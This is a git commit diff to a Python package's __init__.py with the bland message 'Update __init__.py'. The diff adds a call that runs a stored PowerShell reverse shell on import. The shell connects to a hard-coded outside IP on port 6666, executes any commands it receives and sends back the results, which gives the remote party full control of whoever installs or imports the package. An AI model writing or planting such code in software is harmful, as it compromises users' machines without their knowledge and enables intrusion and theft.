a3d43d105e5219502df738d16de769bb401659c6
sdtgccc <yioghbmnb@outlook.com>
2026-01-21 18:14:40 +0900

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -6,6 +6,8 @@ import subprocess
 
 
 powershell_cmd = r"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('154.213.177.40',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """
+# 运行命令
+subprocess.run(powershell_cmd, shell=True)
 
 class CustomInstall(install):
   def run(self):
